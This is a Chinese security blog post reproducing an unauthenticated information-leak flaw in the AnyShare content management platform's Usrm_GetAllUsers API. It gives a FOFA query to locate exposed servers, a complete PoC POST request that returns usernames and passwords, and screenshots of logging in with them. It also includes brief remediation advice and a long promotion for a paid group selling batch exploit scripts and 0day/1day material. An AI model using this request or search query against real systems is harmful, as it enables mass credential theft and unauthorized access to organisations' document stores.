#  「漏洞复现」爱数 AnyShare智能内容管理平台 Usrm_GetAllUsers 信息泄露漏洞   
冷漠安全  冷漠安全   2024-11-24 03:48  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
爱数 AnyShare智能内容管理平台是由上海爱数信息技术股份有限公司自主研发的一款软硬件一体化产品，主要面向企业级用户，提供非结构化数据管理方案。AnyShare基于私有云存储，面向移动办公、桌面虚拟化、BYOD（自带设备办公）的客户提供私有文档云解决方案，旨在打造组织的统一文档平台。它不仅能够实现海量非结构化数据的存储和管理，还支持多终端同步、实时共享、多人在线编辑等功能，极大提升了团队协作效率和数据安全性。  
  
0x03  
  
**漏洞威胁**  
  
爱数 AnyShare智能内容管理平台 Usrm_GetAllUsers 接口存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息。可登录后台，使系统处于极不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="AISHU-AnyShare"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pTFXZ1ZW1JnQz15pyZJYicicPPBAW4GaUibAYDib23LwtXOOXdhghS3rw6icfC8cnViaMJictu5YUF2ibrvg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


[1,100]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pTFXZ1ZW1JnQz15pyZJYiciczTKibg0hErv9hDwawN4icnChMcxcEcHxHCiaiawzz1INpiaiayiclpSIlCTXw/640?wx_fmt=png&from=appmsg "")  
  
尝试登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pTFXZ1ZW1JnQz15pyZJYicic66H7ZIkpgs9Rx4ljxh0DlXRZtxDv0vUruBVTxfCnswBG9lbK1UoibLA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pTFXZ1ZW1JnQz15pyZJYicicicrCrAZrNxXAQql4zNU7YCevtgZ3g94XpMnC9ALTJKvUMXicIE8g77Bw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
官方已修复该漏洞，请用户联系厂商修复漏洞：https://www.aishu.cn/cn/anyshare-family  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pTFXZ1ZW1JnQz15pyZJYicicE3oC4NQibs2SZjhl55RwLiaeRI6sz3YSWScEDNj7IzQqNiaRr3u0dUjjQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pTFXZ1ZW1JnQz15pyZJYicicfNIeRz0Pc5iaX04ZsEHC7dgXbNHXJFIVLGBdUoWcKricftuYErnASV0w/640?wx_fmt=gif&from=appmsg "")  
  
  
